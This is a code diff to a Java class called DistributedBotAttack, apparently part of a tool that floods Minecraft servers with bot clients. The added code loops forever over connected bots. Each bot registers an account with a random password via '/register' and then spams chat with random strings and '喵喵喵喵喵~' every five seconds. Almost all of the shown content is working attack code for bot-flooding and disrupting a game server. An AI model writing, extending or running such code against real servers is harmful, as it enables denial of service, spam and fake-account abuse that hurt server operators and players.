@@ -15,6 +15,7 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
 import org.spacehq.mc.protocol.MinecraftProtocol;
+import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
 import org.spacehq.mc.protocol.packet.ingame.client.ClientPluginMessagePacket;
 import org.spacehq.mc.protocol.packet.ingame.client.ClientTabCompletePacket;
 import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
@@ -54,6 +55,26 @@ public class DistributedBotAttack extends IAttack {
     }
 
     public void start(final String ip, final int port) {
+        setTask(() -> {
+            while (true) {
+                synchronized (clients) {
+                    clients.forEach(c -> {
+                        if (c.getSession().isConnected()) {
+                            if (c.getSession().hasFlag("login")) {
+                                c.getSession().send(new ClientChatPacket(Utils.getRandomString(1, 4) + "喵喵喵喵喵~"));
+                            } else if (c.getSession().hasFlag("join")) {
+                                String pwd = Utils.getRandomString(7, 12);
+                                c.getSession().send(new ClientChatPacket("/register " + pwd + " " + pwd));
+                                c.getSession().setFlag("login", true);
+                            }
+
+                        }
+                    });
+                }
+                Utils.sleep(5 * 1000);
+            }
+        });
+
         this.starttime = System.currentTimeMillis();
 
         mainThread = new Thread(() -> {
